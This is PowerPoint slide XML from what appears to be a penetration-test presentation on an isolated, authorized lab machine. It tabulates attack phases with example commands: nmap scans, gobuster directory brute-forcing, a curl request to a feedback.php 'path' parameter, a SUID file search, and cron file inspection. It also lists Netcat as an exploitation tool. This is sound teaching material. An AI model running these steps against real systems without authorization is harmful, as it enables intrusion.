          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4572000"/>
            <a:ext cx="9875520" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="4754880"/>
            <a:ext cx="9144000" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHY ISOLATION MATTERS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="5074920"/>
            <a:ext cx="9326880" cy="1005840"/>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250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No traffic ever leaves the virtual switch — no production system, third party, or real-world host is ever in scope or reachable.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>This satisfies the core rule of ethical penetration testing: written authorization + a strictly bounded target. Every technique shown here was used only against a system we owned and were explicitly authorized to test.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3</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01 · INTRODUCTION</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Penetration Testing Methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1508760"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="1508760"/>
            <a:ext cx="3200400" cy="685800"/>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ip, route, Nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1508760"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>sudo nmap -sn 192.168.76.0/24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2304288"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2304288"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Service Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="2304288"/>
            <a:ext cx="3200400" cy="685800"/>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Nmap -sC -sV -O</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="2304288"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>sudo nmap -Pn -sC -sV -O -p 21,22,80,3306,33060 &lt;target&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3099816"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3099816"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Web Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="3099816"/>
            <a:ext cx="3200400" cy="685800"/>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curl, Gobuster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3099816"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>gobuster dir -u http://&lt;target&gt;/root/ -w big.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3895344"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3895344"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="3895344"/>
            <a:ext cx="3200400" cy="685800"/>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curl, Netcat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3895344"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>curl -G --data-urlencode "path=..." .../feedback.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4690872"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4690872"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Post-Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="4690872"/>
            <a:ext cx="3200400" cy="685800"/>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find, ps, stat, file, readelf, strings, ldd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4690872"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>find / -perm -4000 -type f 2&gt;/dev/null</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5486400"/>
            <a:ext cx="11109960" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5486400"/>
            <a:ext cx="2743200" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privilege Escalation Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="5486400"/>
            <a:ext cx="3200400" cy="685800"/>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find, ps, cron review, permission analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5486400"/>
            <a:ext cx="4572000" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>cat /etc/cron.d/php ; stat .shelf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1188720"/>
            <a:ext cx="2743200" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHASE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3611880" y="1188720"/>
            <a:ext cx="3200400" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MAIN TOOLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1188720"/>
            <a:ext cx="4572000" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>EXAMPLE COMMAND ACTUALLY USED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4</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01 · INTRODUCTION</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Tools Used in This Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="10972800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
